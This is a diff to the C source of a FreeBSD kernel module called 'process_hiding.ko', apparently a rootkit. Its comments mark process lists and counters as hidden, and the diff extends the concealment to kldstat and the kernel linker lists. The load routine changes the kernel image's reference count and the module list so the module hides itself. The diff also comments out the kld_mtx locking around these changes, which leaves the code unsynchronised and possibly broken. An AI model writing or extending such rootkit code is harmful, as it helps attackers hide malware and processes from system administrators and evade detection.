@@ -2,6 +2,8 @@
 // p_list: Hidden
 // p_hash: Hidden
 // nprocs: Hidden
+// kldstat kernel reference: Hidden
+// linker-lists: Hidden
 // parents process child list: Exposed
 // parent process process-group list: Exposed
 
@@ -25,7 +27,11 @@
 #include <vm/vm_page.h>
 #include <vm/vm_map.h>
 
-#include <dirent.h>
+#include <sys/queue.h>
+#include <sys/sx.h>
+
+
+// #include <dirent.h>
 
 
 // #define ORIGINAL	"/sbin/hello"
@@ -34,7 +40,7 @@
 #define VERSION		"process_hiding.ko"
 
 extern linker_file_list_t linker_files;
-extern struct mtx kld_mtx;
+// extern struct mtx kld_mtx;
 extern int next_file_id;
 
 typedef TAILQ_HEAD(, module) modulelist_t;
@@ -112,7 +118,7 @@ load(struct module *module, int cmd, void *arg)
 		struct module *mod;
 
 		mtx_lock(&Giant);
-		mtx_lock(&kld_mtx);
+		// mtx_lock(&kld_mtx);
 
 		/* Decrement the current kernel image's reference count. */
 		(&linker_files)->tqh_first->refs--;
@@ -129,7 +135,7 @@ load(struct module *module, int cmd, void *arg)
 			}
 		}
 
-		mtx_unlock(&kld_mtx);
+		// mtx_unlock(&kld_mtx);
 		mtx_unlock(&Giant);
 
 		sx_xlock(&modules_sx);
